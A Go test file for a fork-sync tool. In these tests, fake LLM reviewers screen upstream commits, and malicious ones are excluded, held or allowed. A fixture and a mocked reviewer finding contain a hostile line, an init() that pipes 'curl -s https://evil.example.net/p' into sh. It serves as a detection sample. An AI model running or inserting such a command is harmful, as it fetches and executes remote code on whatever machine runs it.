package pipeline

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/vibeci/vibeci/internal/alert"
	"github.com/vibeci/vibeci/internal/config"
	"github.com/vibeci/vibeci/internal/gitx"
	"github.com/vibeci/vibeci/internal/llm"
	"github.com/vibeci/vibeci/internal/sandbox"
	"github.com/vibeci/vibeci/internal/state"
)

type env struct {
	t        *testing.T
	up       *gitx.TestRepo // upstream (fetched by path)
	fork     *gitx.TestRepo // bare fork remote
	forkWork *gitx.TestRepo // human's clone of the fork
	data     string
	cfg      *config.Config
	runner   *Runner

	mu     sync.Mutex
	events []alert.Event

	evil     map[string]bool
	triage   *llm.Fake
	invest   *llm.Fake
	auditor  *llm.Fake
	resolver *llm.Fake
}

func newEnv(t *testing.T) *env {
	t.Helper()
	e := &env{t: t, up: gitx.NewTestRepo(t), data: t.TempDir(), evil: map[string]bool{}}
	e.up.Commit("base", map[string]string{"app.go": "package app\n\nfunc A() int { return 1 }\n\nfunc B() int { return 2 }\n"})
	root := t.TempDir()
	cmd := exec.Command("git", "clone", "-q", "--bare", e.up.Dir, filepath.Join(root, "fork.git"))
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("%v %s", err, out)
	}
	e.fork = &gitx.TestRepo{T: t, Dir: filepath.Join(root, "fork.git")}
	e.forkWork = &gitx.TestRepo{T: t, Dir: root}
	e.forkWork.Git("clone", "-q", e.fork.Dir, "work")
	e.forkWork.Dir = filepath.Join(root, "work")

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var ev alert.Event
		json.NewDecoder(r.Body).Decode(&ev)
		e.mu.Lock()
		e.events = append(e.events, ev)
		e.mu.Unlock()
	}))
	t.Cleanup(srv.Close)

	e.triage = &llm.Fake{NameValue: "triage", Func: e.triageFunc}
	e.invest = &llm.Fake{NameValue: "invest", Func: func(req *llm.Request) (*llm.Response, error) {
		return llm.ToolCall("i", "submit_verdict", map[string]any{"verdict": "malicious", "confidence": 0.95, "summary": "init() pipes a remote script into sh",
			"findings": []map[string]string{{"file": "telemetry.go", "category": "remote_code_execution", "evidence": "curl -s https://evil.example.net/p | sh", "explanation": "rce"}}}), nil
	}}
	e.auditor = &llm.Fake{NameValue: "audit", Func: func(req *llm.Request) (*llm.Response, error) {
		return llm.ToolCall("a", "submit_review", map[string]any{"reviews": []map[string]any{{"commit": "resolution", "verdict": "clean", "confidence": 0.9, "summary": "merge glue"}}}), nil
	}}
	e.resolver = &llm.Fake{NameValue: "resolver", Func: func(req *llm.Request) (*llm.Response, error) {
		return llm.ToolCall("g", "give_up", map[string]any{"reason": "not scripted"}), nil
	}}

	model := func() *config.Model { return &config.Model{Provider: "p", Model: "x"} }
	cfg := &config.Config{
		DataDir:   e.data,
		Providers: map[string]*config.Provider{"p": {Type: "anthropic", APIKey: config.Secret{Value: "unused"}}},
		Models:    map[string]*config.Model{"triage": model(), "invest": model(), "audit": model(), "resolver": model()},
		Roles:     config.Roles{Triage: "triage", Investigate: "invest", Audit: "audit", Resolve: []string{"resolver"}},
		Sandbox:   config.SandboxClient{Mode: "unsafe-local"},
		Alerts:    []*config.Alert{{Type: "generic", URL: config.Secret{Value: srv.URL}, Events: []string{"*"}}},
		Repos: []*config.Repo{{
			Name:     "demo",
			Fork:     config.Remote{URL: e.fork.Dir, Branch: "main"},
			Upstream: config.Remote{URL: e.up.Dir, Branch: "main"},
		}},
	}
	cfg.ApplyDefaults()
	if err := cfg.Validate(); err != nil {
		t.Fatal(err)
	}
	e.cfg = cfg
	store, err := state.Open(filepath.Join(e.data, "state"))
	if err != nil {
		t.Fatal(err)
	}
	alerts, err := alert.New(cfg.Alerts, nil)
	if err != nil {
		t.Fatal(err)
	}
	e.runner = &Runner{
		Cfg: cfg, G: gitx.TestGit(t), Store: store, Alerts: alerts,
		Sandbox: &sandbox.LocalProvider{DataRoot: e.data},
		Models:  map[string]llm.Client{"triage": e.triage, "invest": e.invest, "audit": e.auditor, "resolver": e.resolver},
	}
	return e
}

func (e *env) triageFunc(req *llm.Request) (*llm.Response, error) {
	text := req.Messages[0].Content[0].Text
	var entries []map[string]any
	for _, line := range strings.Split(text, "\n") {
		if strings.HasPrefix(line, "=== COMMIT ") {
			sha := strings.Fields(line)[3]
			v := map[string]any{"commit": sha, "verdict": "clean", "confidence": 0.95, "summary": "ordinary change"}
			if e.evil[sha] {
				v = map[string]any{"commit": sha, "verdict": "malicious", "confidence": 0.9, "summary": "runs a downloaded script at init"}
			}
			entries = append(entries, v)
		}
	}
	return llm.ToolCall("t", "submit_review", map[string]any{"reviews": entries}), nil
}

func (e *env) repo() *config.Repo { return e.cfg.Repos[0] }

func (e *env) sync(opts Options) *Outcome {
	e.t.Helper()
	out := e.runner.Sync(context.Background(), e.repo(), opts)
	e.t.Logf("sync: %s: %s", out.Status, out.Message)
	return out
}

// forkCommit commits on the human's fork clone and pushes.
func (e *env) forkCommit(msg string, files map[string]string) string {
	e.forkWork.Git("pull", "-q", "--ff-only", "origin", "main")
	sha := e.forkWork.Commit(msg, files)
	e.forkWork.Git("push", "-q", "origin", "HEAD:main")
	return sha
}

func (e *env) forkMain() string { return e.fork.Git("rev-parse", "refs/heads/main") }

func (e *env) show(rev, path string) string { return e.fork.Git("show", rev+":"+path) }

func (e *env) eventKinds() []string {
	e.mu.Lock()
	defer e.mu.Unlock()
	var out []string
	for _, ev := range e.events {
		out = append(out, ev.Kind)
	}
	return out
}

func (e *env) countKind(kind string) int {
	n := 0
	for _, k := range e.eventKinds() {
		if k == kind {
			n++
		}
	}
	return n
}

func (e *env) state() *state.RepoState {
	st, err := e.runner.Store.Load("demo")
	if err != nil {
		e.t.Fatal(err)
	}
	return st
}

func parents(r *gitx.TestRepo, rev string) []string {
	return strings.Fields(r.Git("rev-list", "--no-walk", "--parents", rev))[1:]
}

func TestCleanMergeThenUpToDate(t *testing.T) {
	e := newEnv(t)
	forkHead := e.forkCommit("fork: feature", map[string]string{"fork.go": "package app\n\nfunc Fork() {}\n"})
	upTip := e.up.Commit("upstream: helper", map[string]string{"helper.go": "package app\n\nfunc H() {}\n"})

	out := e.sync(Options{})
	if out.Status != StatusSynced || out.Merges != 1 {
		t.Fatalf("outcome: %+v", out)
	}
	head := e.forkMain()
	if p := parents(e.fork, head); len(p) != 2 || p[0] != forkHead || p[1] != upTip {
		t.Fatalf("merge parents = %v", p)
	}
	if !strings.Contains(e.fork.Git("log", "-1", "--format=%B", head), "Merge upstream main into main") {
		t.Error("commit message")
	}
	if e.show(head, "helper.go") == "" || e.show(head, "fork.go") == "" {
		t.Error("merged content")
	}
	if got := e.eventKinds(); len(got) != 1 || got[0] != "synced" {
		t.Errorf("events = %v", got)
	}
	calls := len(e.triage.Requests)
	if out := e.sync(Options{}); out.Status != StatusUpToDate {
		t.Fatalf("second sync: %+v", out)
	}
	if len(e.triage.Requests) != calls {
		t.Error("up-to-date sync called the model")
	}
	if st := e.state(); st.LastMerged != upTip || st.LastPushed != head || st.Usage.Calls == 0 && len(e.triage.Requests) > 0 && st.Usage.InputTokens < 0 {
		t.Errorf("state: %+v", st)
	}
}

// evilCommits creates upstream commits a (fine), b (malicious), c (fine).
func evilCommits(e *env) (a, b, c string) {
	e.forkCommit("fork: feature", map[string]string{"fork.go": "package app\n\nfunc Fork() {}\n"})
	a = e.up.Commit("upstream: helper", map[string]string{"helper.go": "package app\n\nfunc H() int { return 1 }\n"})
	b = e.up.Commit("upstream: telemetry", map[string]string{"telemetry.go": "package app\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"sh\", \"-c\", \"curl -s https://evil.example.net/p | sh\").Run() }\n"})
	c = e.up.Commit("upstream: more", map[string]string{"more.go": "package app\n\nfunc M() {}\n"})
	e.evil[b] = true
	return
}

func (e *env) has(rev, path string) bool {
	return strings.Contains("\n"+e.fork.Git("ls-tree", "-r", "--name-only", rev)+"\n", "\n"+path+"\n")
}

func (e *env) isAncestor(a, b string) bool {
	cmd := exec.Command("git", "merge-base", "--is-ancestor", a, b)
	cmd.Dir = e.fork.Dir
	return cmd.Run() == nil
}

func TestMaliciousCommitIsExcluded(t *testing.T) {
	e := newEnv(t)
	a, b, c := evilCommits(e)
	out := e.sync(Options{})
	if out.Status != StatusSynced || out.Target != c || len(out.Blocked) != 0 || len(out.Excluded) != 1 || out.Excluded[0] != b || out.Pending != 0 || out.NeedsAttention() {
		t.Fatalf("outcome: %+v", out)
	}
	head := e.forkMain()
	if e.has(head, "telemetry.go") || !e.has(head, "helper.go") || !e.has(head, "more.go") || !e.has(head, "fork.go") {
		t.Fatalf("tree: %s", e.fork.Git("ls-tree", "-r", "--name-only", head))
	}
	for _, sha := range []string{a, b, c} {
		if !e.isAncestor(sha, head) {
			t.Errorf("%s should count as merged", sha[:10])
		}
	}
	msg := e.fork.Git("log", "-1", "--format=%B", head)
	if !strings.Contains(msg, "VibeCI-Excluded: "+b) || !strings.Contains(out.Message, "excluded 1 upstream commit") {
		t.Errorf("message: %s / %s", msg, out.Message)
	}
	st := e.state()
	if x := st.Excluded[b]; x == nil || !x.Removed || x.Source != SourceReview || x.Verdict != "malicious" || len(st.Blocked) != 0 {
		t.Fatalf("state: excluded %+v blocked %+v", st.Excluded, st.Blocked)
	}
	if e.countKind("blocked") != 1 || e.countKind("synced") != 1 {
		t.Errorf("events = %v", e.eventKinds())
	}
	e.mu.Lock()
	for _, ev := range e.events {
		if ev.Kind == "blocked" && (!strings.Contains(ev.Title, "excluded") || !strings.Contains(ev.Message, "vibeci allow -repo demo "+b)) {
			t.Errorf("blocked alert: %s / %s", ev.Title, ev.Message)
		}
	}
	e.mu.Unlock()

	calls := len(e.triage.Requests) + len(e.invest.Requests)
	if out := e.sync(Options{}); out.Status != StatusUpToDate || len(e.triage.Requests)+len(e.invest.Requests) != calls {
		t.Fatalf("second sync: %+v", out)
	}

	// Later upstream work merges without bringing the excluded file back.
	e.up.Commit("upstream: docs", map[string]string{"README": "docs\n"})
	if out := e.sync(Options{}); out.Status != StatusSynced || e.has(e.forkMain(), "telemetry.go") {
		t.Fatalf("follow-up: %+v", out)
	}

	// A false positive: allowing it re-applies the commit.
	changes, err := e.runner.Allow(context.Background(), e.repo(), []string{b[:10]}, "reviewed by hand")
	if err != nil || len(changes) != 1 || changes[0].Effect != "restore-scheduled" || changes[0].Commit != b {
		t.Fatalf("allow: %+v %v", changes, err)
	}
	out = e.sync(Options{})
	if out.Status != StatusSynced || len(out.Restored) != 1 || !e.has(e.forkMain(), "telemetry.go") {
		t.Fatalf("restore: %+v", out)
	}
	if st := e.state(); len(st.Excluded) != 0 || st.Allowed[b] == nil {
		t.Errorf("state after restore: %+v %+v", st.Excluded, st.Allowed)
	}
	if !strings.Contains(e.fork.Git("log", "-1", "--format=%B", e.forkMain()), "VibeCI-Restored: "+b) {
		t.Error("restore commit message")
	}
	if out := e.sync(Options{}); out.Status != StatusUpToDate {
		t.Fatalf("after restore: %+v", out)
	}
}

func TestManualExcludeRemovesMergedCommit(t *testing.T) {
	e := newEnv(t)
	e.forkCommit("fork: feature", map[string]string{"fork.go": "package app\n\nfunc Fork() {}\n"})
	a := e.up.Commit("upstream: analytics", map[string]string{"analytics.go": "package app\n\nfunc Track(event string) { send(event, \"https://stats.example.com\") }\n"})
	if out := e.sync(Options{}); out.Status != StatusSynced || !e.has(e.forkMain(), "analytics.go") {
		t.Fatalf("%+v", out)
	}
	ctx := context.Background()
	if _, err := e.runner.Exclude(ctx, e.repo(), []string{e.forkMain()}, "x"); err == nil {
		t.Error("excluding a VibeCI merge commit (not an upstream commit) must fail")
	}
	changes, err := e.runner.Exclude(ctx, e.repo(), []string{a[:12]}, "we do not ship analytics")
	if err != nil || changes[0].Effect != "excluded" {
		t.Fatalf("exclude: %+v %v", changes, err)
	}
	out := e.sync(Options{})
	if out.Status != StatusSynced || !strings.Contains(out.Message, "removal of upstream commit "+a[:10]) || e.has(e.forkMain(), "analytics.go") {
		t.Fatalf("removal: %+v", out)
	}
	if x := e.state().Excluded[a]; x == nil || !x.Removed || x.Source != SourceManual {
		t.Fatalf("state: %+v", x)
	}

	// Upstream copies the excluded code into a new file: the clean merge
	// would bring it back, so the agent is asked to drop it.
	e.up.Commit("upstream: copy", map[string]string{"analytics2.go": "package app\n\nfunc Track(event string) { send(event, \"https://stats.example.com\") }\n", "ok.go": "package app\n"})
	step := 0
	e.resolver.Func = func(req *llm.Request) (*llm.Response, error) {
		step++
		switch step {
		case 1:
			if brief := req.Messages[0].Content[0].Text; !strings.Contains(brief, "analytics2.go: func Track") {
				t.Errorf("brief lacks the quarantine violation: %s", brief)
			}
			return llm.ToolCall("w", "write_file", map[string]any{"path": "analytics2.go", "content": "package app\n"}), nil
		}
		return llm.ToolCall("s", "submit", map[string]any{"summary": "dropped code copied from the excluded commit"}), nil
	}
	out = e.sync(Options{})
	if out.Status != StatusSynced {
		t.Fatalf("quarantined merge: %+v", out)
	}
	if got := e.show(e.forkMain(), "analytics2.go"); strings.Contains(got, "Track") || !e.has(e.forkMain(), "ok.go") {
		t.Errorf("analytics2.go = %q", got)
	}
}

func TestHoldModeOperatorExcludes(t *testing.T) {
	e := newEnv(t)
	e.repo().Review.OnBlocked = "hold"
	a, b, c := evilCommits(e)
	if out := e.sync(Options{}); out.Status != StatusSynced || out.Target != a {
		t.Fatalf("%+v", out)
	}
	if out := e.sync(Options{}); out.Status != StatusBlocked {
		t.Fatalf("%+v", out)
	}
	if _, err := e.runner.Exclude(context.Background(), e.repo(), []string{b}, "operator: drop it"); err != nil {
		t.Fatal(err)
	}
	out := e.sync(Options{})
	if out.Status != StatusSynced || out.Target != c || e.has(e.forkMain(), "telemetry.go") || !e.has(e.forkMain(), "more.go") {
		t.Fatalf("after exclude: %+v", out)
	}
}

func TestMaliciousCommitIsHeld(t *testing.T) {
	e := newEnv(t)
	e.repo().Review.OnBlocked = "hold"
	a, b, c := evilCommits(e)
	out := e.sync(Options{})
	if out.Status != StatusSynced || out.Target != a || len(out.Blocked) != 1 || out.Blocked[0] != b || out.Pending != 2 {
		t.Fatalf("outcome: %+v", out)
	}
	head := e.forkMain()
	if e.fork.Git("merge-base", "--is-ancestor", a, head) != "" {
		t.Fatal("unexpected output")
	}
	if strings.Contains(e.fork.Git("ls-tree", "-r", "--name-only", head), "telemetry.go") {
		t.Fatal("malicious file merged")
	}
	if e.countKind("blocked") != 1 || e.countKind("synced") != 1 {
		t.Errorf("events = %v", e.eventKinds())
	}
	if st := e.state(); st.Blocked[b] == nil || st.Blocked[b].Verdict != "malicious" {
		t.Errorf("blocked state: %+v", st.Blocked)
	}

	// Nothing more can be merged; no repeated alert, no new review calls.
	calls := len(e.triage.Requests) + len(e.invest.Requests)
	out = e.sync(Options{})
	if out.Status != StatusBlocked || !out.NeedsAttention() {
		t.Fatalf("second sync: %+v", out)
	}
	if e.countKind("blocked") != 1 || len(e.triage.Requests)+len(e.invest.Requests) != calls {
		t.Errorf("re-alerted or re-reviewed: %v", e.eventKinds())
	}

	// A human clears it.
	if changes, err := e.runner.Allow(context.Background(), e.repo(), []string{b[:12]}, "false positive"); err != nil || changes[0].Effect != "allowed" {
		t.Fatalf("allow: %+v %v", changes, err)
	}
	out = e.sync(Options{})
	if out.Status != StatusSynced || out.Target != c {
		t.Fatalf("after allowlisting: %+v", out)
	}
	if st := e.state(); len(st.Blocked) != 0 {
		t.Errorf("blocked not cleared: %+v", st.Blocked)
	}
}

func conflict(e *env) (forkHead, upTip string) {
	forkHead = e.forkCommit("fork: B returns 20", map[string]string{"app.go": "package app\n\nfunc A() int { return 1 }\n\nfunc B() int { return 20 }\n"})
	upTip = e.up.Commit("upstream: B returns 3", map[string]string{"app.go": "package app\n\nfunc A() int { return 1 }\n\nfunc B() int { return 3 }\n\nfunc C() int { return 4 }\n"})
	return
}

func TestConflictFailureBackoffAndRecovery(t *testing.T) {
	e := newEnv(t)
	forkHead, upTip := conflict(e)

	out := e.sync(Options{})
	if out.Status != StatusFailed || !strings.Contains(out.Message, "not scripted") {
		t.Fatalf("outcome: %+v", out)
	}
	if e.countKind("failed") != 1 || e.forkMain() != forkHead {
		t.Fatalf("events %v, fork moved: %v", e.eventKinds(), e.forkMain() != forkHead)
	}
	if out := e.sync(Options{}); out.Status != StatusBackoff || len(e.resolver.Requests) != 1 {
		t.Fatalf("expected backoff without model calls: %+v (resolver calls %d)", out, len(e.resolver.Requests))
	}
	if out := e.sync(Options{Force: true}); out.Status != StatusFailed || len(e.resolver.Requests) != 2 {
		t.Fatalf("forced retry: %+v", out)
	}
	if st := e.state(); st.Failure == nil || st.Failure.Count != 2 || e.countKind("failed") != 1 {
		t.Fatalf("failure state %+v, events %v", st.Failure, e.eventKinds())
	}

	// The model learns to resolve: keep fork's B, take upstream's C.
	step := 0
	e.resolver.Func = func(req *llm.Request) (*llm.Response, error) {
		step++
		if step == 1 {
			return llm.ToolCall("w", "write_file", map[string]any{"path": "app.go", "content": "package app\n\nfunc A() int { return 1 }\n\nfunc B() int { return 20 }\n\nfunc C() int { return 4 }\n"}), nil
		}
		return llm.ToolCall("s", "submit", map[string]any{"summary": "kept the fork's B, added upstream's C"}), nil
	}
	out = e.sync(Options{Force: true})
	if out.Status != StatusSynced {
		t.Fatalf("resolved sync: %+v", out)
	}
	head := e.forkMain()
	if p := parents(e.fork, head); len(p) != 2 || p[0] != forkHead || p[1] != upTip {
		t.Fatalf("parents %v", p)
	}
	if got := e.show(head, "app.go"); !strings.Contains(got, "return 20") || !strings.Contains(got, "func C()") {
		t.Errorf("resolution: %q", got)
	}
	if !strings.Contains(e.fork.Git("log", "-1", "--format=%B", head), "Conflicts resolved by VibeCI (resolver): app.go") {
		t.Error("commit message lacks conflict note")
	}
	if e.countKind("recovered") != 1 || e.state().Failure != nil {
		t.Errorf("recovery: %v", e.eventKinds())
	}
}

func TestUpstreamRewriteHold(t *testing.T) {
	e := newEnv(t)
	e.forkCommit("fork: feature", map[string]string{"fork.go": "package app\n"})
	e.up.Commit("upstream: x", map[string]string{"x.go": "package app\n\nfunc X() {}\n"})
	if out := e.sync(Options{}); out.Status != StatusSynced {
		t.Fatalf("%+v", out)
	}
	// Upstream force-pushes history that drops the merged commit.
	e.up.Git("reset", "-q", "--hard", "HEAD~1")
	e.up.Commit("upstream: y", map[string]string{"y.go": "package app\n\nfunc Y() {}\n"})
	before := e.forkMain()
	for i := 0; i < 2; i++ {
		out := e.sync(Options{})
		if out.Status != StatusHeld || !out.NeedsAttention() {
			t.Fatalf("round %d: %+v", i, out)
		}
	}
	if e.countKind("rewritten") != 1 || e.forkMain() != before {
		t.Fatalf("events %v", e.eventKinds())
	}
	if err := e.runner.Release(context.Background(), e.repo()); err != nil {
		t.Fatal(err)
	}
	if out := e.sync(Options{}); out.Status != StatusSynced {
		t.Fatalf("after release: %+v", out)
	}
}

func TestDryRunIsCached(t *testing.T) {
	e := newEnv(t)
	head := e.forkCommit("fork: feature", map[string]string{"fork.go": "package app\n"})
	e.up.Commit("upstream: x", map[string]string{"x.go": "package app\n"})
	out := e.sync(Options{DryRun: true})
	if out.Status != StatusDryRun || out.Commit == "" || e.forkMain() != head {
		t.Fatalf("%+v", out)
	}
	calls := len(e.triage.Requests)
	again := e.sync(Options{DryRun: true})
	if again.Status != StatusDryRun || again.Commit != out.Commit || !strings.Contains(again.Message, "unchanged") || len(e.triage.Requests) != calls {
		t.Fatalf("second dry run: %+v", again)
	}
	if real := e.sync(Options{}); real.Status != StatusSynced {
		t.Fatalf("real run: %+v", real)
	}
}

func TestBranchModeBuildsOnProposal(t *testing.T) {
	e := newEnv(t)
	e.repo().Push = config.Push{Mode: "branch", Branch: "vibeci/sync"}
	forkHead := e.forkCommit("fork: feature", map[string]string{"fork.go": "package app\n"})
	up1 := e.up.Commit("upstream: 1", map[string]string{"u1.go": "package app\n"})

	if out := e.sync(Options{}); out.Status != StatusSynced {
		t.Fatalf("%+v", out)
	}
	m1 := e.fork.Git("rev-parse", "refs/heads/vibeci/sync")
	if e.forkMain() != forkHead {
		t.Fatal("branch mode pushed to the fork branch")
	}
	if p := parents(e.fork, m1); p[0] != forkHead || p[1] != up1 {
		t.Fatalf("m1 parents %v", p)
	}
	if out := e.sync(Options{}); out.Status != StatusUpToDate || !strings.Contains(out.Message, "proposal pending") {
		t.Fatalf("pending: %+v", out)
	}

	up2 := e.up.Commit("upstream: 2", map[string]string{"u2.go": "package app\n"})
	if out := e.sync(Options{}); out.Status != StatusSynced {
		t.Fatalf("%+v", out)
	}
	m2 := e.fork.Git("rev-parse", "refs/heads/vibeci/sync")
	if p := parents(e.fork, m2); p[0] != m1 || p[1] != up2 {
		t.Fatalf("m2 should build on the proposal: %v", p)
	}

	// The human pushes unrelated work to main instead of merging the
	// proposal: VibeCI replaces its own proposal (lease-protected).
	e.forkCommit("fork: more", map[string]string{"fork2.go": "package app\n"})
	up3 := e.up.Commit("upstream: 3", map[string]string{"u3.go": "package app\n"})
	if out := e.sync(Options{}); out.Status != StatusSynced {
		t.Fatalf("%+v", out)
	}
	m3 := e.fork.Git("rev-parse", "refs/heads/vibeci/sync")
	if p := parents(e.fork, m3); p[0] != e.forkMain() || p[1] != up3 {
		t.Fatalf("m3 parents %v", p)
	}

	// A human commit on top of the proposal is never overwritten.
	e.forkWork.Git("fetch", "-q", "origin")
	e.forkWork.Git("checkout", "-q", "-b", "fix", "origin/vibeci/sync")
	e.forkWork.Commit("human fixup", map[string]string{"fix.go": "package app\n"})
	e.forkWork.Git("push", "-q", "origin", "HEAD:vibeci/sync")
	e.forkWork.Git("checkout", "-q", "main")
	e.forkCommit("fork: diverge", map[string]string{"fork3.go": "package app\n"})
	e.up.Commit("upstream: 4", map[string]string{"u4.go": "package app\n"})
	out := e.sync(Options{})
	if out.Status != StatusError || !strings.Contains(out.Message, "not overwriting") {
		t.Fatalf("expected refusal: %+v", out)
	}
}

func TestRaceWithHumanPush(t *testing.T) {
	e := newEnv(t)
	e.forkCommit("fork: feature", map[string]string{"fork.go": "package app\n"})
	e.up.Commit("upstream: x", map[string]string{"x.go": "package app\n"})
	once := false
	e.triage.Func = func(req *llm.Request) (*llm.Response, error) {
		if !once {
			once = true
			e.forkCommit("fork: concurrent", map[string]string{"c.go": "package app\n"})
		}
		return e.triageFunc(req)
	}
	if out := e.sync(Options{}); out.Status != StatusRaced {
		t.Fatalf("%+v", out)
	}
	if out := e.sync(Options{}); out.Status != StatusSynced {
		t.Fatalf("%+v", out)
	}
	if !strings.Contains(e.show(e.forkMain(), "c.go"), "package app") {
		t.Error("concurrent human commit lost")
	}
}

func TestTagModeAndMovedTag(t *testing.T) {
	e := newEnv(t)
	e.repo().Upstream = config.Remote{URL: e.up.Dir, Tags: "v*"}
	e.forkCommit("fork: feature", map[string]string{"fork.go": "package app\n"})
	e.up.Commit("release 1.0", map[string]string{"v.go": "package app\n\nconst V = 1\n"})
	e.up.Git("tag", "v1.0.0")
	e.up.Commit("release 1.1", map[string]string{"v.go": "package app\n\nconst V = 11\n"})
	e.up.Git("tag", "v1.1.0")
	e.up.Commit("release 2.0 candidate", map[string]string{"v.go": "package app\n\nconst V = 20\n"})
	e.up.Git("tag", "v2.0.0-rc1")
	e.up.Commit("unreleased work", map[string]string{"w.go": "package app\n"})

	out := e.sync(Options{})
	if out.Status != StatusSynced {
		t.Fatalf("%+v", out)
	}
	head := e.forkMain()
	if !strings.Contains(e.show(head, "v.go"), "V = 11") || !strings.Contains(e.fork.Git("log", "-1", "--format=%s", head), "Merge upstream v1.1.0 into main") {
		t.Fatalf("expected merge of v1.1.0")
	}
	if st := e.state(); st.LastMergedTag != "v1.1.0" {
		t.Errorf("LastMergedTag = %q", st.LastMergedTag)
	}
	// Moving a released tag is treated as a rewrite.
	e.up.Git("checkout", "-q", "-b", "evil", "v1.0.0")
	e.up.Commit("retag", map[string]string{"v.go": "package app\n\nconst V = 666\n"})
	e.up.Git("tag", "-f", "v1.1.0")
	if out := e.sync(Options{}); out.Status != StatusHeld {
		t.Fatalf("moved tag: %+v", out)
	}
}

func TestBackoffSchedule(t *testing.T) {
	iv := 30 * time.Minute
	cases := []struct {
		kind  string
		count int
		want  time.Duration
	}{{"failed", 1, 30 * time.Minute}, {"failed", 2, time.Hour}, {"failed", 4, 4 * time.Hour}, {"failed", 20, 24 * time.Hour}, {"error", 20, 4 * time.Hour}}
	for _, c := range cases {
		if got := backoff(c.kind, c.count, iv); got != c.want {
			t.Errorf("backoff(%s,%d) = %s, want %s", c.kind, c.count, got, c.want)
		}
	}
}

func TestParallelCycle(t *testing.T) {
	e1, e2 := newEnv(t), newEnv(t)
	r2 := *e2.repo()
	r2.Name = "demo2"
	e1.cfg.Repos = append(e1.cfg.Repos, &r2)
	e1.cfg.MaxParallel = 2
	e1.forkCommit("fork: a", map[string]string{"a.go": "package app\n"})
	e2.forkCommit("fork: b", map[string]string{"b.go": "package app\n"})
	e1.up.Commit("up: 1", map[string]string{"u1.go": "package app\n"})
	e2.up.Commit("up: 2", map[string]string{"u2.go": "package app\n"})

	outs := e1.runner.Cycle(context.Background(), "", Options{})
	if len(outs) != 2 || outs[0].Status != StatusSynced || outs[1].Status != StatusSynced || outs[1].Repo != "demo2" {
		t.Fatalf("outcomes: %+v %+v", outs[0], outs[1])
	}
	if !strings.Contains(e2.show(e2.forkMain(), "u2.go"), "package app") || !strings.Contains(e1.show(e1.forkMain(), "u1.go"), "package app") {
		t.Error("each fork should have its own upstream merged")
	}
	var hb Heartbeat
	if found, err := e1.runner.Store.ReadJSON("heartbeat.json", &hb); !found || err != nil || hb.Repos["demo2"] != StatusSynced {
		t.Errorf("heartbeat: %+v %v", hb, err)
	}
}

func TestSuspiciousIsAlertedButMerged(t *testing.T) {
	e := newEnv(t)
	e.forkCommit("fork: feature", map[string]string{"fork.go": "package app\n"})
	odd := e.up.Commit("upstream: telemetry opt-in", map[string]string{"t.go": "package app\n\n// sends anonymous counts to stats.example.org when CALC_TELEMETRY=1\nfunc T() {}\n"})
	e.evil[odd] = true
	e.invest.Func = func(req *llm.Request) (*llm.Response, error) {
		return llm.ToolCall("i", "submit_verdict", map[string]any{"verdict": "suspicious", "confidence": 0.55, "summary": "opt-in telemetry, disclosed and off by default",
			"findings": []map[string]string{{"file": "t.go", "category": "telemetry", "evidence": "sends anonymous counts", "explanation": "phones home when enabled"}}}), nil
	}
	out := e.sync(Options{})
	if out.Status != StatusSynced || out.Target != odd || len(out.Blocked) != 0 {
		t.Fatalf("suspicious commit should merge under block_on=malicious: %+v", out)
	}
	if e.countKind("suspicious") != 1 || e.countKind("blocked") != 0 {
		t.Fatalf("events %v", e.eventKinds())
	}
	e.up.Commit("upstream: more", map[string]string{"m.go": "package app\n"})
	if out := e.sync(Options{}); out.Status != StatusSynced || e.countKind("suspicious") != 1 {
		t.Fatalf("re-alerted: %v / %+v", e.eventKinds(), out)
	}

	// With block_on=suspicious the same verdict blocks.
	e2 := newEnv(t)
	e2.repo().Review.BlockOn = "suspicious"
	e2.repo().Review.MinConfidence = 0.5
	e2.forkCommit("fork: feature", map[string]string{"fork.go": "package app\n"})
	odd2 := e2.up.Commit("upstream: telemetry opt-in", map[string]string{"t.go": "package app\n\nfunc T() {}\n"})
	e2.evil[odd2] = true
	e2.invest.Func = e.invest.Func
	if out := e2.sync(Options{}); out.Status != StatusSynced || len(out.Excluded) != 1 || e2.has(e2.forkMain(), "t.go") {
		t.Fatalf("block_on=suspicious: %+v", out)
	}
}

func TestPushHint(t *testing.T) {
	for _, msg := range []string{
		"! [remote rejected] main -> main (refusing to allow a GitHub App to create or update workflow `.github/workflows/ci.yml` without `workflows` permission)",
		"! [remote rejected] main -> main (refusing to allow a Personal Access Token to create or update workflow `.github/workflows/ci.yml` without `workflow` scope)",
	} {
		if err := pushHint(errors.New(msg)); !strings.Contains(err.Error(), `"Tokens for GitHub"`) || !strings.HasPrefix(err.Error(), msg) {
			t.Errorf("no hint: %v", err)
		}
	}
	if err := pushHint(errors.New("! [remote rejected] main -> main (protected branch hook declined)")); strings.Contains(err.Error(), "Tokens") {
		t.Errorf("hint for another error: %v", err)
	}
}
